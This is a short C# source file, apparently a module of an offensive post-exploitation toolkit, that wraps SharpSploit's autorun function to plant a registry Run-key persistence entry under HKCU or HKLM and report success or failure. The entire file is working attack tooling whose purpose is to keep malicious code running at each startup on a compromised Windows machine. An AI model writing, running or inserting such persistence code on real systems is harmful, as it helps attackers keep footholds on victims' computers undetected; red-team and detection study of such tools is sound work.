using System;

using SharpSploit.Persistence;

namespace ExecSploit
{
    public static class PersistAutorun
    {
        public static string Execute(string TargetHive, string Name, string Value = "")
        {
            try
            {
                if (TargetHive.ToLower() != "hkey_current_user" && TargetHive.ToLower() != "hkcu" && TargetHive.ToLower() != "currentuser" &&
                 TargetHive.ToLower() != "hkey_local_machine" && TargetHive.ToLower() != "hklm" && TargetHive.ToLower() != "localmachine")
                {
                    return "Autorun Persistence failed. Invalid Target Hive specified.";
                }

                if (Autorun.InstallAutorun(TargetHive, Value, Name))
                {
                    return "Startup Persistence suceeded for: " + Name;
                }
                return "Startup Persistence failed for: " + Name;
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
    }
}